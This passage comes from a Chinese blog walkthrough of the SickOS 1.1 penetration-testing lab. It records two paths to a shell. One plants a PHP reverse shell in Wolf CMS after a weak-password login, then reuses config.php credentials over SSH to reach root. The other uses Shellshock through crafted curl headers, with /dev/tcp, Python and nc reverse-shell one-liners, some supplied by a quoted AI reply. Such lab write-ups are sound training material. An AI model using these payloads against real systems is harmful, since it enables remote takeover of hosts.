+<li><strong>Dissalow: &#x2F;wolfcms</strong> <strong>这一行是****拼写错误</strong>（应该是 <code>Disallow</code>，而不是 <code>Dissalow</code>），所以<strong>这一行无效</strong>。** **即使拼写正确，它也会被前面的 <code>Disallow: /</code> 覆盖，因为 <code>/</code> 已经禁止了整个网站。</li>
+</ol>
+<hr>
+<h3 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h3><p>**这个 robots.txt 文件的意思是：<strong><strong>不允许任何搜索引擎抓取这个网站的任何内容</strong>。</strong> **但由于第二行拼写错误，它本意可能是想额外强调 <code>/wolfcms</code> 目录也不允许抓取，但因为拼写错误，这一行不会生效。</p>
+</blockquote>
+<p><strong>robots.txt 的作用</strong></p>
+<blockquote>
+<p><code>robots.txt</code> 是一个<strong>纯文本文件</strong>，放在网站根目录下（比如 <code>https://example.com/robots.txt</code>），它的作用是：</p>
+<blockquote>
+<p><strong>告诉搜索引擎爬虫（robot&#x2F;spider）哪些页面可以抓，哪些不能抓。</strong></p>
+</blockquote>
+<hr>
+<h3 id="✅-它不是："><a href="#✅-它不是：" class="headerlink" title="✅ 它不是："></a>✅ 它<strong>不是</strong>：</h3><ul>
+<li><strong>法律意义上的“禁止”——只是****礼貌性协议</strong>，恶意爬虫可以无视它。</li>
+<li><strong>访问控制工具——它****不能阻止用户或程序访问页面</strong>，只是告诉搜索引擎“请不要索引这些内容”。</li>
+</ul>
+<hr>
+<h3 id="✅-它是："><a href="#✅-它是：" class="headerlink" title="✅ 它是："></a>✅ 它<strong>是</strong>：</h3><ul>
+<li><strong>一种****君子协定</strong>，主流搜索引擎（Google、Bing、百度等）都会遵守。</li>
+<li><strong>用来****减少服务器压力</strong>、<strong>保护隐私内容</strong>、<strong>避免重复索引</strong>等。</li>
+</ul>
+<hr>
+<h3 id="✅-常见用法示例："><a href="#✅-常见用法示例：" class="headerlink" title="✅ 常见用法示例："></a>✅ 常见用法示例：</h3><table>
+<thead>
+<tr>
+<th><strong>示例</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>User-agent: *</code> <code>Disallow: /</code></td>
+<td><strong>禁止所有搜索引擎抓取整个网站</strong></td>
+</tr>
+<tr>
+<td><code>User-agent: *</code> <code>Disallow: /private/</code></td>
+<td><strong>禁止抓取</strong><code>/private/</code> 目录下的内容</td>
+</tr>
+<tr>
+<td><code>User-agent: Googlebot</code> <code>Disallow: /</code></td>
+<td><strong>只禁止 Google 抓取全站</strong></td>
+</tr>
+<tr>
+<td><code>User-agent: *</code> <code>Allow: /public/</code> <code>Disallow: /</code></td>
+<td><strong>禁止全站，但允许</strong><code>/public/</code> 目录（Google 支持）</td>
+</tr>
+</tbody></table>
+<hr>
+<h3 id="✅-小提示："><a href="#✅-小提示：" class="headerlink" title="✅ 小提示："></a>✅ 小提示：</h3><ul>
+<li><strong>文件必须叫 <strong><code>robots.txt</code>，必须放在</strong>网站根目录</strong>。</li>
+<li><strong>区分大小写，</strong><code>Disallow</code> 不能拼成 <code>Dissalow</code>（就像你刚才看到的那样）。</li>
+<li><strong>如果你想****彻底阻止访问</strong>，应该用密码、防火墙或登录系统，而不是 <code>robots.txt</code>。</li>
+</ul>
+<hr>
+<h3 id="✅-总结一句话："><a href="#✅-总结一句话：" class="headerlink" title="✅ 总结一句话："></a>✅ 总结一句话：</h3><blockquote>
+<p><code>robots.txt</code> 是网站给搜索引擎的“<strong>爬虫使用说明书</strong>”，<strong>不是门锁，只是告示牌</strong>。</p>
+</blockquote>
+</blockquote>
+<h5 id="wolfcms"><a href="#wolfcms" class="headerlink" title="&#x2F;wolfcms"></a>&#x2F;wolfcms</h5><p><strong>可以看到这是一个预设，刚装完</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131898.png" alt="image-20251027180317086"></p>
+<p><strong>看到可以用****Administrator</strong> 发文章，是给好消息，我们能否用这个高权限身份</p>
+<p><strong>发表时间很早，说明是旧版本，可能有漏洞</strong></p>
+<h6 id="找管理员路径，即登陆路径"><a href="#找管理员路径，即登陆路径" class="headerlink" title="找管理员路径，即登陆路径"></a>找管理员路径，即登陆路径</h6><p><strong>怎样找****管理员路径来登录</strong>    猜 或者 百度</p>
+<p><strong>wolfcm admin path</strong></p>
+<p><strong>而原网页也有相似内容，那换成 admin 是不是就可以了？</strong></p>
+<p><strong>（思路）</strong></p>
+<p><strong>搜   &#x2F;?&#x2F;admin   即可跳转</strong></p>
+<h6 id="如何登录"><a href="#如何登录" class="headerlink" title="如何登录"></a>如何登录</h6><p><strong>如何登录：1.暴力破解    2.默认密码（default admin password ）    3.弱密码（adminnistrator   123&#x2F;password&#x2F;abc&#x2F;admin）</strong></p>
+<p><strong>网上找没找到，但是发现****admin</strong> 词经常出现，就试 admin 为用户名</p>
+<p><strong>弱密码 admin admin 成功登录</strong></p>
+<p><strong>其实****并不偶然</strong>，这是一个<strong>新建</strong>的内容管理系统，他的东西都还没有部署，弱密码可能性极高。<strong>思路必备</strong></p>
+<h6 id="查看有用信息"><a href="#查看有用信息" class="headerlink" title="查看有用信息"></a>查看有用信息</h6><p><strong>page</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131899.png" alt="image-20251027183350966"></p>
+<p><strong>点进 homeage 后，发现可以****执行 php 命令（webshell 或者 一句话）</strong></p>
+<p><strong>about us 是纯文本文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131900.png" alt="image-20251027184028537"></p>
+<p><strong>也可以执行 php 命令</strong></p>
+<p><strong>snippets：译为可复用的代码片段</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131901.png" alt="image-20251027184344125"></p>
+<p><strong>layouts 意为 布局</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131902.png" alt="image-20251027184809246"></p>
+<p><strong>里面是 html 的脚本也夹杂着 php 代码</strong></p>
+<p><strong>file 是 文件</strong></p>
+<p><strong>里面可以改权限</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131903.png" alt="image-20251027185028192"></p>
+<p><strong>还可以上传文件</strong></p>
+<h6 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h6><p><strong>1.可以替换 php 代码</strong></p>
+<p><strong>2.可以上传文件</strong></p>
+<p><strong>3.改文件权限</strong></p>
+<p><strong>4.有复用的头文件和脚文件</strong></p>
+<h2 id="获得初始-shell"><a href="#获得初始-shell" class="headerlink" title="获得初始 shell"></a>获得初始 shell</h2><h3 id="一句话木马"><a href="#一句话木马" class="headerlink" title="一句话木马"></a>一句话木马</h3><p><strong>找一个一句话木马，放在一个页面中，试试能不能反弹 shell</strong></p>
+<p><strong>可以搜 php reverse shell one-liner   (php 反弹 shell 的一句话木马)</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php exec(&quot;/bin/bash -c &#x27;bash -i &gt;&amp; /dev/tcp/10.10.10.3/443 0&gt;&amp;1&#x27;&quot;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><strong>直接加在里面，10.10.10.3 是自己的 kali   443 端口（成功性更大，一个不行就换另一个）</strong></p>
+<p><strong>然后 save</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131904.png" alt="image-20251027185915184"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134947839.png" alt="image-20251027185935228"></p>
+<p><strong>在正式执行这个页面之前，先在 kali 上监听</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131905.png" alt="image-20251027190031942"></p>
+<p><strong>返回 wolfcms 主页，点击我们刚才修改的 article 标签，可以看到 kali 中收到了反弹 shell</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134948655.png" alt="image-20251027190208209"></p>
+<h3 id="成功反弹-shell"><a href="#成功反弹-shell" class="headerlink" title="成功反弹 shell"></a>成功反弹 shell</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131906.png" alt="image-20251027190659102"></p>
+<p><strong>发现没有 flag</strong></p>
+<h2 id="尝试提权"><a href="#尝试提权" class="headerlink" title="尝试提权"></a>尝试提权</h2><h3 id="config-php"><a href="#config-php" class="headerlink" title="config.php"></a>config.php</h3><p>**但是有 config.php  **</p>
+<p><strong>思路：凡是这种内容管理系统，这样的一套应用，只要涉及到数据库，都有一个配置文件，一般来说他的凭据（也就是用户名密码）会写在里面。   而 wolfcms 本身就是一套内容管理系统，那么前端后端肯定有连接的配置文件</strong></p>
+<p><strong>这里可以用 vim 编辑器打开，有分色可以便于查看</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim config.php</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131907.png" alt="image-20251027191257177"></p>
+<p><strong>可以看到</strong></p>
+<p><strong>数据库连接的用户名 root</strong></p>
+<p>**密码  **<strong>john@123</strong>  会不会是 ssh 连接的密码，因为我们发现了 22 ssh  也是系统管理员在管理系统的时候登录我们渗透的靶机用的凭据，但用户名不一定是 root，如果有用户，一定在 passwd 里面</p>
+<h3 id="看系统有哪些用户"><a href="#看系统有哪些用户" class="headerlink" title="看系统有哪些用户"></a>看系统有哪些用户</h3><p><strong>daemon 一般供程序来使用，很少供管理员做人机交互</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134948989.png" alt="image-20251027194313597"></p>
+<p><strong>有 bash 权限的都可以试，比如 sickos</strong></p>
+<p><strong>可以看到 sickos 就是就是这台机器的名字</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134949842.png" alt="image-20251027194549037"></p>
+<h3 id="先尝试-ssh-连接-root-账户"><a href="#先尝试-ssh-连接-root-账户" class="headerlink" title="先尝试 ssh 连接 root 账户"></a>先尝试 ssh 连接 root 账户</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo ssh root@10.10.10.19</span><br><span class="line">password:john@123</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131908.png" alt="image-20251027195012527"></p>
+<h3 id="尝试-ssh-连接其他账户（都用-john-123-也有可能都不行）"><a href="#尝试-ssh-连接其他账户（都用-john-123-也有可能都不行）" class="headerlink" title="尝试 ssh 连接其他账户（都用 john@123   也有可能都不行）"></a>尝试 ssh 连接其他账户（都用 john@123   也有可能都不行）</h3><h3 id="www-data-bashup-账户不行"><a href="#www-data-bashup-账户不行" class="headerlink" title="www-data&#x2F;bashup 账户不行"></a>www-data&#x2F;bashup 账户不行</h3><p><strong>我们这些都是纯手工，域渗透经常使用 cratmap 自动化测试</strong></p>
+<h3 id="直到-sickos"><a href="#直到-sickos" class="headerlink" title="直到 sickos"></a>直到 sickos</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134950928.png" alt="image-20251027195531963"></p>
+<p><strong>这个凭据和数据库连接的凭据是一样的</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131909.png" alt="image-20251027195635030"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l  列出当前用户的权限</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131910.png" alt="image-20251027195835090"></p>
+<p><strong>发现有全部权限</strong></p>
+<p><strong>那么我们用 sudo 新起一个 bash，我们就能获取 root 权限</strong></p>
+<p><strong>获取一个 shell 时，习惯性的看一看是不是你要的那个 shell   （ip a …）</strong></p>
+<h3 id="获得-root"><a href="#获得-root" class="headerlink" title="获得 root"></a>获得 root</h3><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131911.png" alt="image-20251027200150838"></p>
+<h2 id="总结图"><a href="#总结图" class="headerlink" title="总结图"></a>总结图</h2><p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134951903.png" alt="image-20251027200756364"></p>
+<h1 id="SickOS1-1-Shellshock-原理和利用过程-解法二"><a href="#SickOS1-1-Shellshock-原理和利用过程-解法二" class="headerlink" title="SickOS1.1 - Shellshock 原理和利用过程-解法二"></a>SickOS1.1 - Shellshock 原理和利用过程-解法二</h1><p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞 Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园</a></p>
+<p>**3128 代理服务器（解法一）     **</p>
+<p>**8080    **</p>
+<h2 id="nikto-扫描"><a href="#nikto-扫描" class="headerlink" title="nikto 扫描"></a>nikto 扫描</h2><p><strong>一般情况只要-h 参数即可，因为这里需要 proxy（代理）加上 -useproxy</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nikto -h 10.10.10.19 -useproxy http://10.10.10.19:3128</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131912.png" alt="image-20251029182638343"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134953574.png" alt="image-20251029183245179"></p>
+<p><strong>该漏洞在 Red Hat、CentOS、Ubuntu 、Fedora 、Amazon Linux 、OS X 10.10 中均拥有存在 CVE-2014-6271（即“破壳”漏洞）漏洞的 Bash 版本，同时由于 Bash 在各主流操作系统的广泛应用，此漏洞的影响范围包括但不限于大多数应用 Bash 的 Unix、Linux、Mac OS X，而针对这些操作系统管理下的数据均存在高危威胁。</strong></p>
+<p><strong>漏洞的利用方式会通过与 Bash 交互的多种应用展开，包括 HTTP、OpenSSH、DHCP 等</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/Cl0ud/p/14248937.html">Bash 破壳漏洞 Shellshock （CVE-2014-6271）复现分析 - 春告鳥 - 博客园</a></p>
+<p><strong>可以看到这个目录存在该漏洞</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134953597.png" alt="image-20251029183127733"></p>
+<blockquote>
+<p><strong>环境变量 和 bash 有操作的</strong></p>
+</blockquote>
+<h2 id="shellshock-的验证"><a href="#shellshock-的验证" class="headerlink" title="shellshock 的验证"></a>shellshock 的验证</h2><h3 id="使用-curl-设置代理"><a href="#使用-curl-设置代理" class="headerlink" title="使用 curl 设置代理"></a>使用 curl 设置代理</h3><blockquote>
+<p><code>/cgi-bin/</code> 只是 Web 服务器里的一条“<strong>执行通行证</strong>”映射：** **<strong>URL 里看到它，就代表后面的文件会被当成 CGI 程序拉起来跑。</strong> **物理目录在哪、叫什么都行，<strong><strong>关键是有 <code>ExecCGI</code> 权限</strong>；</strong> **但 30 年习惯下来，<strong>扫描器和黑客还是最爱先打 <code>/cgi-bin/</code></strong>。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -v --proxy http://10.10.10.19:3128 http:10.10.10.19/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; echo &#x27;Content-Type:text/plain&#x27;; echo ;echo; /usr/bin/id;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134953640.png" alt="image-20251029184707866"></p>
+<p><strong>-v 显示更详细信息</strong></p>
+<p><strong>-proxy 指定代理服务器</strong></p>
+<p><strong>-H 指定主机头  —&gt; 添加一个恶意的 HTTP 请求头，触发 Shellshock 漏洞</strong></p>
+<blockquote>
+<ul>
+<li><code>() &#123; test;&#125;;</code>：这是 Bash 函数定义语法，用来触发漏洞。</li>
+<li><code>echo &#39;Content-Type:text/plain&#39;;</code>：伪造 HTTP 响应头，使服务器返回纯文本格式。</li>
+<li><code>echo ;echo;</code>：输出空行，符合 HTTP 响应格式。</li>
+<li><code>/usr/bin/id</code>：实际执行的命令，显示当前运行 CGI 脚本的用户身份。</li>
+<li><code>exit</code>：结束 Bash 进程，防止后续错误。</li>
+</ul>
+</blockquote>
+<blockquote>
+<p>**为什么需要两个 echo？因为 HTTP 协议规定，头部和主体之间必须用一个空行来分隔。第一个 **<code>echo</code> 产生的空行结束了 <code>Content-Type: test/plain</code> 这个头部。但是，某些 CGI 实现或服务器配置可能会自动在脚本输出前添加一些自己的头部信息（如 <code>Date</code>, <code>Server</code> 等）师傅使用两个空行是一种非常谨慎和常见的技巧。第一个空行：结束攻击者自己输出的 <code>Content-Type</code> 头。第二个空行：确保即使服务器自动添加了其他头部，这个额外的空行也能最终形成 <code>【服务器头部】\n【攻击者头部】\n\n【主体】</code> 的格式，从而绝对确保空行的存在，将 HTTP 头部与主体正确分开。这样，<code>/usr/bin/id</code> 命令的输出就不会被当作 HTTP 头部，而是作为响应主体显示出来。</p>
+</blockquote>
+<p>**返回 **<code>uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></p>
+<p>**这表示你已经通过 CGI 脚本以 **<code>www-data</code> 用户身份执行了命令。</p>
+<p><strong>说明有这个漏洞</strong></p>
+<h2 id="shellshock-获得初始系统-shell"><a href="#shellshock-获得初始系统-shell" class="headerlink" title="shellshock 获得初始系统 shell"></a>shellshock 获得初始系统 shell</h2><p><strong>构造 payload   ：bash 的反弹 shell</strong></p>
+<h3 id="构造-payload-方式一，用-msfvenom"><a href="#构造-payload-方式一，用-msfvenom" class="headerlink" title="构造 payload 方式一，用 msfvenom"></a>构造 payload 方式一，用 msfvenom</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p cmd/unix/reverse_bash lhost=10.10.10.3 lport=443 -f raw</span><br></pre></td></tr></table></figure>
+
+
+<table>
+<thead>
+<tr>
+<th><strong>段落</strong></th>
+<th><strong>含义</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>sudo</code></td>
+<td><strong>以 root 权限运行（本地需要写文件或调用库时才必要，这里其实可加可不加）。</strong></td>
+</tr>
+<tr>
+<td><code>msfvenom</code></td>
+<td><strong>Metasploit 的独立 payload 生成器。</strong></td>
+</tr>
+<tr>
+<td><code>-p cmd/unix/reverse_bash</code></td>
+<td><strong>选用</strong>**“Bash 直连”**型反向 shell（内部就是 <code>/dev/tcp</code> 那段代码）。</td>
+</tr>
+<tr>
+<td><code>lhost=10.10.10.3</code></td>
+<td><strong>告诉 payload****回连的 IP</strong>（你的 Kali&#x2F;攻击机）。</td>
+</tr>
+<tr>
+<td><code>lport=443</code></td>
+<td><strong>回连的端口，这里写成 443 通常能绕过简单防火墙。</strong></td>
+</tr>
+<tr>
+<td><code>-f raw</code></td>
+<td><strong>只输出裸代码</strong>，不生成 elf、exe、war 等文件，适合复制粘贴。</td>
+</tr>
+</tbody></table>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131913.png" alt="image-20251029185654326"></p>
+<p><strong>得到：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bash -c &#x27;0&lt;&amp;144-;exec 144&lt;&gt;/dev/tcp/10.10.10.3/443;sh &lt;&amp;144 &gt;&amp;144 2&gt;&amp;144&#x27;</span><br><span class="line">以实际输出结果为准</span><br></pre></td></tr></table></figure>
+
+<p><strong>如果写 sh  在实际情况中环境变量未必设好了，如果未设好，可能不成功</strong></p>
+<p><strong>最好把 sh 修改为完全路径</strong></p>
+<p><strong>我们****先不修改</strong>看看会怎么样</p>
+<p><strong>先监听端口</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lvnp 443</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131914.png" alt="image-20251029191216473"></p>
+<p><strong>再执行命令</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -v --proxy http://10.10.10.19:3128 http:10.10.10.19/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;144-;exec 144&lt;&gt;/dev/tcp/10.10.10.3/443;sh &lt;&amp;144 &gt;&amp;144 2&gt;&amp;144&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131915.png" alt="image-20251029191455708"></p>
+<p><strong>发现连接成功以后立马断开</strong></p>
+<p><strong>提示的是****sh</strong> 没有这个文件或者路径，所以说明简写路径是不行的，要写上完全路径</p>
+<p><strong>补全为完全路径后：就是加个</strong><code>bin/</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -v --proxy http://10.10.10.19:3128 http:10.10.10.19/cgi-bin/status -H &quot;Referer:() &#123; test;&#125;; 0&lt;&amp;144-;exec 144&lt;&gt;/dev/tcp/10.10.10.3/443;bin/sh &lt;&amp;144 &gt;&amp;144 2&gt;&amp;144&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134955304.png" alt="image-20251029191710053"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131916.png" alt="image-20251029191844809"></p>
+<p><strong>可以发现监听成功</strong></p>
+<h3 id="构造-payload-方式二，用-AI"><a href="#构造-payload-方式二，用-AI" class="headerlink" title="构造 payload 方式二，用 AI"></a>构造 payload 方式二，用 AI</h3><p><strong>成不成另说</strong></p>
+<blockquote>
+<p>**下面给你 3 组最常用的 <strong><strong>反向 shell payload</strong>，任选其一即可。</strong> <strong>所有命令都基于你已有的 Shellshock 利用方式，只需把下面 payload 整体替换掉前面那条 curl 里的 <code>/usr/bin/id;exit</code> 部分即可。</strong> **（假设你本机监听端口为 4444，IP 为 192.168.1.100，请按实际修改）</p>
+<hr>
+<h3 id="✅-1-Bash-直接反弹（最简洁）"><a href="#✅-1-Bash-直接反弹（最简洁）" class="headerlink" title="✅ 1. Bash 直接反弹（最简洁）"></a>✅ 1. Bash 直接反弹（最简洁）</h3><p><strong>bash</strong></p>
+<p><strong>复制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="✅-2-Python-版本（目标没-dev-tcp-时更稳）"><a href="#✅-2-Python-版本（目标没-dev-tcp-时更稳）" class="headerlink" title="✅ 2. Python 版本（目标没 &#x2F;dev&#x2F;tcp 时更稳）"></a>✅ 2. Python 版本（目标没 &#x2F;dev&#x2F;tcp 时更稳）</h3><p><strong>Python</strong></p>
+<p><strong>复制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.168.1.100&quot;,4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="✅-3-nc-传统版（目标有-nc-且带-e）"><a href="#✅-3-nc-传统版（目标有-nc-且带-e）" class="headerlink" title="✅ 3. nc 传统版（目标有 nc 且带 -e）"></a>✅ 3. nc 传统版（目标有 nc 且带 -e）</h3><p><strong>bash</strong></p>
+<p><strong>复制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.1.100 4444</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="🔧-使用步骤（以-Bash-版为例）"><a href="#🔧-使用步骤（以-Bash-版为例）" class="headerlink" title="🔧 使用步骤（以 Bash 版为例）"></a>🔧 使用步骤（以 Bash 版为例）</h3><ol>
+<li><p><strong>在你本机先监听</strong><br><strong>bash</strong><br><strong>复制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nvlp 4444</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>发送 payload（整条命令）</strong><br><strong>bash</strong><br><strong>复制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo curl -v --proxy http://10.10.10.19:3128 \</span><br><span class="line">  http://10.10.10.19/cgi-bin/status \</span><br><span class="line">  -H &quot;Referer:() &#123; test;&#125;; echo &#x27;Content-Type:text/plain&#x27;; echo; echo; /bin/bash -i &gt;&amp; /dev/tcp/192.168.1.100/4444 0&gt;&amp;1;exit&quot;</span><br></pre></td></tr></table></figure></li>
+<li><p>**回到监听窗口，拿到 **<strong>www-data</strong> 用户的交互式 shell。</p>
+</li>
+</ol>
+<hr>
+<h3 id="⚠️-小贴士"><a href="#⚠️-小贴士" class="headerlink" title="⚠️ 小贴士"></a>⚠️ 小贴士</h3><ul>
+<li>**如果目标在内网，记得把 **<code>192.168.1.100</code> 换成你能收到包的 <strong>攻击机 IP</strong>。</li>
+<li><strong>端口 4444 被占用就换别的。</strong></li>
+<li>**如果目标没出网，可把 IP 填成 **<strong>10.10.10.x 段</strong>的 Kali 地址。</li>
+</ul>
+<p>**拿到 shell 后，记得 **<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code> 升级成交互式终端。</p>
+</blockquote>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="获得交互式-shell"><a href="#获得交互式-shell" class="headerlink" title="获得交互式 shell"></a>获得交互式 shell</h3><p><strong>先看一下什么系统</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131917.png" alt="image-20251029192247655"></p>
+<p><strong>dpkg-l 看装了哪些软件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134956443.png" alt="image-20251029192339415"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134956499.png" alt="image-20251029192452994"></p>
+<p><strong>这些的目的是：看是什么系统（ubuntu），装了什么（如 python） 考虑如何获得一个交互式 shell</strong></p>
+<p><strong>如用 python 获得交互式 shell（带提示符）</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134957655.png" alt="image-20251029192533928"></p>
+<p><strong>尝试看看如何提权：</strong></p>
+<h3 id="为提权做信息搜集"><a href="#为提权做信息搜集" class="headerlink" title="为提权做信息搜集"></a>为提权做信息搜集</h3><p><strong>sudo -l 看用户权限，需要密码；由于我们是反弹 shell 获得的，不知道（上一种方式里面有），放弃</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134957654.png" alt="image-20251029192835798"></p>
+<p><strong>该目录下没有有用信息</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131918.png" alt="image-20251029193143554"></p>
+<p><strong>有用 www-data 主要是为网站服务的，那我们看看网站下面都有什么</strong></p>
+<p>**一般在 **<code>/var/www</code> 下</p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131919.png" alt="image-20251029193403687"></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131920.png" alt="image-20251029193528278"></p>
+<p><strong>可以查看各文件</strong></p>
+<p><strong>robots 文件</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131921.png" alt="image-20251029193451720"></p>
+<p><strong>bash 的历史命令</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134959642.png" alt="image-20251029193603627"></p>
+<p><strong>在告诉你：我在很规律的执行任务连接某些事（定时任务？），希望你尝试我的服务</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320134959911.png" alt="image-20251029193734260"></p>
+<p><strong>这是靶机，而且是网站目录，会有这个提示，是很明显的提示了，正常情况不可能会有这种，但要有这个思路</strong></p>
+<h3 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h3><p><strong>services 都在&#x2F;etc 目录下</strong></p>
+<p><img src="https://raw.githubusercontent.com/LMLsama/picgo/main/images/20260320135131922.png" alt="image-20251029194449219"></p>
